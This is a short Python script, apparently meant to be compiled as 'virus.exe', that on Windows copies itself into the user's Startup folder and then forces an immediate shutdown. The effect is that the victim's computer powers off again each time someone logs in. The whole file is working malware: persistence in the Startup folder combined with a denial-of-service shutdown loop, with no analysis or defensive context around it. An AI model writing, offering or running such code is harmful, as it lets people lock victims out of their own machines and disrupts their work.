import getpass
import shutil
import os
import pathlib
from sys import platform

currentPath = str(pathlib.Path().resolve()) + '\\' + 'virus.exe'
user = getpass.getuser()
new = fr'C:\Users\{user}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\virus.exe'

if platform == 'win32':
    if currentPath != new:
        shutil.move(currentPath, new)
    os.system("shutdown /s /t 1")